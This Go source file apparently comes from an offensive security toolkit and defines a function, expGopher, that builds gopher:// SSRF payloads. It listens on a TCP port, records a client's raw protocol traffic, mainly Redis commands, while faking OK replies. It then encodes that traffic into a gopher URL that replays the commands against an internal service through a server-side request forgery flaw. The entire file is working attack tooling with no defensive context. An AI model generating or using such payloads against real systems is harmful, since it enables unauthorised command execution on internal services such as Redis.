package gopher

import (
	"fmt"
	"net"
	"net/url"
	"regexp"
	"strings"

	"github.com/virzz/virzz/logger"
)

func expGopher(addr string, port, n int, quit bool) (string, error) {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return "", err
	}
	defer ln.Close()
	logger.NormalF("Listen: %s", ln.Addr().String())
	conn, err := ln.Accept()
	if err != nil {
		return "", err
	}
	defer conn.Close()
	var data = make([]string, n)
	for i := 0; i < n; i++ {
		buff := make([]byte, 2048)
		// Read
		n, err := conn.Read(buff)
		if err != nil {
			return "", err
		}
		tmp := string(buff[:n])
		logger.DebugF("buff = %s", tmp)
		data[i] = tmp

		// Fix redis::command
		if tmp == "*1\r\n$7\r\nCOMMAND\r\n" {
			i--
		}
		// Resp
		matches := regexp.MustCompile(`(?m)\*\d+\r\n\$\d+\r\n\w+\r\n`).FindAllString(tmp, -1)
		if len(matches) > 0 && len(matches[0]) > 0 {
			conn.Write([]byte("+OK\r\n"))
			continue
		}
		conn.Write([]byte("OK\r\n"))
	}
	if quit {
		data = append(data, "*1\r\n$4\r\nquit\r\n")
	}
	exp := fmt.Sprintf(
		"gopher://%s/_%s",
		addr,
		strings.ReplaceAll(url.QueryEscape(strings.Join(data, "")), "+", "%20"),
	)
	return exp, nil
}
